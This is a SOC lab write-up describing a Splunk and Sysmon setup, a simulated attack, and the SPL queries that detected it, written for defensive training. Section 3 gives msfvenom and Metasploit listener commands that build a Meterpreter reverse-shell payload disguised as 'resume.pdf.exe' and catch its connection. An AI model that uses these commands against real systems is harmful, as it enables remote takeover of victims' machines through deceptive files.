# SOC Project – Splunk Lab: Monitor, Attack Simulation & Detection

## Overview

This project demonstrates the setup and use of a Security Operations Center (SOC) lab environment using **Splunk Enterprise**, **Sysmon**, and **Windows/Linux endpoints**. The objective is to simulate an attack within a controlled lab network, capture the telemetry generated, and use Splunk to analyze and detect the malicious activity.

The project follows a typical SOC workflow:

1. **Monitoring**: Collecting logs from multiple endpoints.
2. **Attack Simulation**: Executing a controlled adversary scenario (reverse shell).
3. **Detection**: Using Splunk and Sysmon telemetry to identify and analyze malicious behavior.

> ⚠️ **Disclaimer:** This experiment was performed in an isolated lab environment with no internet access. All offensive tools were used strictly for educational and defensive security purposes.

---

## 1. Lab Architecture

### Components

* **Splunk Enterprise Server (Ubuntu 22.04)** – Acts as the central SIEM server.
* **Windows 11 Endpoint** – Acts as the victim machine.
* **Kali Linux** – Simulates the attacker machine.

### Network Setup

All machines were configured on a **host-only virtual network**, ensuring complete isolation from the internet.

**Data Flow:**

```
Windows 11 (Sysmon + Splunk Universal Forwarder) → Splunk Server (Ubuntu)
Linux host logs → Splunk Server (local input)
```

![Architecture Diagram]()

---

## 2. Environment Setup

### Splunk Installation (Ubuntu 22.04)

```bash
sudo dpkg -i splunk-10.0.1-c486717c322b-linux-amd64.deb
sudo /opt/splunk/bin/splunk start --accept-license
```

Enable Splunk to start at boot:

```bash
sudo /opt/splunk/bin/splunk enable boot-start
```

### Sysmon Installation (Windows 11)

1. Download Sysmon from Sysinternals.
2. Install using a custom configuration file:

```powershell
Sysmon64.exe -accepteula -i sysmonconfig.xml
```

### Splunk Universal Forwarder (Windows 11)

1. Install Splunk UF and set forwarding to Splunk Server:

```powershell
splunk add forward-server <Splunk-IP>:9997 -auth admin:<password>
```

2. Configure inputs in `C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf`:

```ini
[WinEventLog://Security]
index=wineventlog

[WinEventLog://System]
index=wineventlog

[WinEventLog://Application]
index=wineventlog

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
index=sysmon
```

3. Restart the forwarder:

```powershell
splunk restart
```

---

## 3. Attack Simulation

### Objective

Simulate an attacker (Kali) delivering a reverse TCP payload to the Windows endpoint to test telemetry visibility.

### Steps

1. On Kali, create a reverse shell payload:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali-IP> LPORT=4444 -f exe -o resume.pdf.exe
```

2. Deliver payload to Windows (manually transferred within the host-only network).
3. Start Metasploit listener:

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <Kali-IP>
set LPORT 4444
run
```

4. Execute the payload on the Windows 11 machine.

![Attack Execution Screenshot]()

Once executed, the attacker successfully established a reverse shell session back to the Kali machine.

---

## 4. Telemetry Collection & Detection

### Sysmon Event Monitoring

Sysmon generated several key event types:

* **Event ID 1** – Process creation (`resume.pdf.exe`)
* **Event ID 3** – Network connection to attacker IP (port 4444)
* **Event ID 10** – Process access (post-exploitation)

These events were forwarded to Splunk via the Universal Forwarder.

### Splunk Queries (SPL)

#### Detecting the Malicious Executable

```spl
index=sysmon Image="*resume.pdf.exe" | table _time, host, User, ParentImage, CommandLine
```

#### Detecting Reverse Shell Connection

```spl
index=sysmon EventCode=3 DestinationPort=4444 | table _time, Image, DestinationIp, DestinationPort
```

#### Correlating Parent/Child Process Chain

```spl
index=sysmon EventCode=1 Image="*resume.pdf.exe" OR Image="*cmd.exe" OR Image="*powershell.exe"
| table _time, ParentImage, Image, CommandLine
```

### Data Model Example (if CIM enabled)

```spl
| datamodel Endpoint Processes search process_name="resume.pdf.exe"
| table _time, user, process, parent_process, dest
```

These queries revealed a suspicious process chain:

```
explorer.exe → resume.pdf.exe → cmd.exe → powershell.exe
```

This strongly indicated post-exploitation activity consistent with malware execution.

![Detection Screenshot]()

---

## 5. Conclusion & Lessons Learned

### Key Takeaways

* Successfully built an isolated SOC lab simulating real-world attack telemetry.
* Verified the ability of Splunk + Sysmon to capture and analyze endpoint activity.
* Demonstrated the importance of Sysmon configuration tuning to ensure high-fidelity event logging.
* SPL queries effectively detected malicious behaviors like reverse shells and encoded PowerShell commands.

### Lessons Learned

* Isolation is everything: Internal-only networking keeps experiments safe.
* User deception is trivial: Double extensions (.pdf.exe) still trick users. Enable “show file extensions.”
* Least privilege matters: Admin users make attacker life easy; standardize non-admin daily use.
Application control helps: Use AppLocker/allow-listing to block unknown binaries (especially in user-write paths).
* EDR + Logging: Keep Defender/EDR enabled with tamper protection; Sysmon + SIEM provide the forensic truth.
* Detections to keep: Alert on suspicious parent/child combos (e.g., *.pdf.exe → cmd.exe, cmd.exe → net.exe) and unusual outbound connections from user processes.


---

## 6. Future Improvements

* Develop **alerting rules** (correlation searches) in Splunk.
* Visualize process/network telemetry via **dashboards**.

---

## References

* [Sysmon Documentation – Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
* [Splunk Common Information Model Add-on](https://splunkbase.splunk.com/app/1621/)
* [MITRE ATT&CK Framework](https://attack.mitre.org/)

---

> Author: crab241
> For educational and research purposes only.
